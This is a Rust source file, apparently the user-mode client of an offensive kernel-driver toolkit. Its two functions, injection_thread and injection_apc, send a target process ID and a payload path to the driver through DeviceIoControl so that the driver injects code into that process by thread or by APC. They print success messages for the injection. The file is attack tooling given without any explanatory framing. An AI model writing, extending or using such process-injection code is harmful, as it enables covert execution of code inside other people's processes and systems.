use {
    core::ffi::c_void,
    crate::driver::open_driver, 
    shared::structs::TargetInjection, 
    std::ptr::null_mut, 
    windows_sys::Win32::{Foundation::CloseHandle, System::IO::DeviceIoControl}
};

pub fn injection_thread(ioctl_code: u32, pid: &u32, path: &String) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    let mut info_injection = TargetInjection {
        path: path.to_string(),
        pid: *pid as usize
    };   
    let mut return_buffer = 0;
    status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_injection as *mut _ as *mut c_void,
            std::mem::size_of::<TargetInjection>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        println!("[+] Process injection successfully performed on PID: {pid}");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn injection_apc(ioctl_code: u32, pid: &u32, path: &String) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    let mut info_injection = TargetInjection {
        path: path.to_string(),
        pid: *pid as usize
    };   
    let mut return_buffer = 0;
    status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_injection as *mut _ as *mut c_void,
            std::mem::size_of::<TargetInjection>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        println!("[+] Process injection APC successfully performed on PID: {pid}");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}
